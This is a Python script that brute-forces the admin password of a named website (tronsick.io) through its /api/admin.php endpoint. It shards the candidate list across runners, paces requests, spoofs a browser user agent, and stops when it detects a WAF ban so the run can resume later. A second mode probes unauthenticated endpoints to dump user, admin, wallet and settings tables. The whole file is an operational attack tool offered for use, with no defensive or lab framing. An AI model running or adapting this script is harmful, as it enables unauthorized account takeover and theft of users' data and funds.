#!/usr/bin/env python3
# tronsick.io legacy-origin admin-password oracle sweep (fresh-egress runner)
# plus unauthenticated /api data-surface recon.
import os, sys, time, json, threading, queue, random

try:
    import requests
    import urllib3
    urllib3.disable_warnings()
except Exception as e:
    print("requests import failed", e, flush=True)
    sys.exit(1)

TARGET    = os.environ.get("TARGET", "https://tronsick.io")
MODE      = os.environ.get("MODE", "admin")          # admin|dump|both|recon
SHARD     = int(os.environ.get("SHARD", "0"))
SHARDS    = int(os.environ.get("SHARDS", "1"))
CONC      = int(os.environ.get("CONC", "2"))
RETRIES   = int(os.environ.get("RETRIES", "6"))
PACE      = float(os.environ.get("PACE", "0.15"))
MAXREQ    = int(os.environ.get("MAXREQ", "0"))       # 0 = no cap
CORPUS    = os.environ.get("CORPUS", "attack/corpus.txt")
ACTION    = os.environ.get("ACTION", "stats")
HITDIR    = os.environ.get("HITDIR", "hits")
os.makedirs(HITDIR, exist_ok=True)

WAF_MARKERS = (
    "Access to this resource on the server is denied",
    "<!DOCTYPE html>",
    "<title> 403 Forbidden",
)

JSON_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Accept": "application/json,text/plain,*/*",
}

SESS = requests.Session()
SESS.verify = False


def is_waf(resp):
    if resp.status_code != 403:
        return False
    t = resp.text
    if len(t) < 2000 and any(m in t for m in WAF_MARKERS):
        return True
    return False


def oracle(pw):
    """Return (kind, code, body) where kind in hit|bad|noauth|banned|retry|err."""
    url = f"{TARGET}/api/admin.php?action={ACTION}"
    h = dict(JSON_HEADERS)
    h["Authorization"] = "Bearer admin:" + pw
    for attempt in range(RETRIES):
        try:
            r = SESS.get(url, headers=h, timeout=25)
            code = r.status_code
            txt = r.text[:300]
            if is_waf(r):
                return ("banned", code, txt)
            if code == 200:
                if "error" not in txt.lower():
                    return ("hit", code, r.text[:4000])
                return ("hit", code, r.text[:4000])
            if code == 403 and "Invalid admin credentials" in txt:
                return ("bad", code, txt)
            if code == 403 and "Admin access required" in txt:
                return ("noauth", code, txt)
            # 500/502/503/504/429/other -> retry
            time.sleep(0.2 * (attempt + 1))
        except Exception as e:
            time.sleep(0.3 * (attempt + 1))
    return ("err", -1, "")


def load_corpus():
    lines = []
    with open(CORPUS, "r", errors="ignore") as f:
        for line in f:
            s = line.rstrip("\n")
            if s:
                lines.append(s)
    seen = set()
    uniq = []
    for p in lines:
        if p not in seen:
            seen.add(p)
            uniq.append(p)
    return uniq


def shard_of(items):
    return [p for i, p in enumerate(items) if i % SHARDS == SHARD]


def run_admin():
    corpus = load_corpus()
    mine = shard_of(corpus)
    print(f"ADMIN SHARD {SHARD}/{SHARDS} candidates={len(mine)} conc={CONC} "
          f"action={ACTION} target={TARGET}", flush=True)

    state = {"n": 0, "hit": None, "bad": 0, "errs": 0, "banned": 0,
             "t0": time.time(), "banned_at": None}
    lock = threading.Lock()
    q = queue.Queue()
    pending = []
    for p in mine:
        q.put(p)
    tested = set()

    def worker():
        while True:
            with lock:
                if state["hit"] or state["banned"]:
                    return
            try:
                pw = q.get_nowait()
            except queue.Empty:
                return
            kind, code, body = oracle(pw)
            with lock:
                state["n"] += 1
                tested.add(pw)
                if kind == "hit":
                    state["hit"] = pw
                    print(f"\n*** ADMIN PASSWORD HIT = {pw!r} code={code}\n{body}\n", flush=True)
                elif kind == "bad":
                    state["bad"] += 1
                elif kind == "banned":
                    state["banned"] += 1
                    state["banned_at"] = pw
                    print(f"\n!!! WAF BAN after {state['n']} req (last={pw!r})", flush=True)
                elif kind == "noauth":
                    state["errs"] += 1
                else:
                    state["errs"] += 1
                n = state["n"]
                if n % 100 == 0 or n == len(mine):
                    el = time.time() - state["t0"]
                    print(f"[{n}/{len(mine)}] {n/el:.2f}/s bad={state['bad']} "
                          f"errs={state['errs']} banned={state['banned']} hit={state['hit']}",
                          flush=True)
            if PACE:
                time.sleep(PACE)

    ths = [threading.Thread(target=worker, daemon=True) for _ in range(max(1, CONC))]
    for t in ths:
        t.start()
    for t in ths:
        t.join()

    # candidates never tested (queued remainder) -> resumable artifact
    rem = []
    while True:
        try:
            rem.append(q.get_nowait())
        except queue.Empty:
            break
    status = {
        "shard": SHARD, "shards": SHARDS, "total": len(mine),
        "tested": len(tested), "bad": state["bad"], "errs": state["errs"],
        "banned": bool(state["banned"]), "banned_at": state["banned_at"],
        "hit": state["hit"], "remaining": len(rem),
    }
    with open(os.path.join(HITDIR, f"tron_admin_{SHARD}.json"), "w") as f:
        json.dump(status, f, indent=2)
    if rem:
        with open(os.path.join(HITDIR, f"remaining_{SHARD}.txt"), "w") as f:
            f.write("\n".join(rem) + "\n")
        print(f"remaining untested={len(rem)} written to remaining_{SHARD}.txt", flush=True)
    if state["hit"]:
        print(f"::warning::TRON_ADMIN_HIT shard={SHARD} pw={state['hit']}", flush=True)
    else:
        print(f"NO ADMIN HIT shard {SHARD} tested={len(tested)} banned={state['banned']}", flush=True)


def recon_unauth():
    """Unauthenticated data-surface recon (dump.php etc.)."""
    out = {}
    probes = [
        ("GET", f"{TARGET}/api/dump.php", None),
        ("GET", f"{TARGET}/api/dump.php?action=dump", None),
        ("GET", f"{TARGET}/api/dump.php?table=site_settings", None),
        ("GET", f"{TARGET}/api/dump.php?table=users", None),
        ("GET", f"{TARGET}/api/dump.php?table=admins", None),
        ("GET", f"{TARGET}/api/dump.php?table=settings", None),
        ("GET", f"{TARGET}/api/dump.php?table=wallets", None),
        ("GET", f"{TARGET}/api/public.php?action=landing_stats", None),
        ("GET", f"{TARGET}/api/debug.php", None),
        ("GET", f"{TARGET}/api/admin.php?action=stats", None),
        ("GET", f"{TARGET}/api/withdrawals.php?action=global_recent", None),
    ]
    for method, url, body in probes:
        try:
            r = SESS.request(method, url, headers=JSON_HEADERS, timeout=25)
            out[url] = {"status": r.status_code, "len": len(r.content),
                        "body": r.text[:6000]}
            print(f"RECON {r.status_code} {len(r.content):6d} {url}", flush=True)
        except Exception as e:
            out[url] = {"error": str(e)}
            print(f"RECON ERR {url} {e}", flush=True)
        time.sleep(PACE)
    with open(os.path.join(HITDIR, f"recon_unauth_{SHARD}.json"), "w") as f:
        json.dump(out, f, indent=2)


if __name__ == "__main__":
    if MODE in ("recon", "both"):
        recon_unauth()
    if MODE in ("admin", "both"):
        run_admin()
    if MODE not in ("admin", "dump", "both", "recon"):
        print("unknown mode", MODE, flush=True)
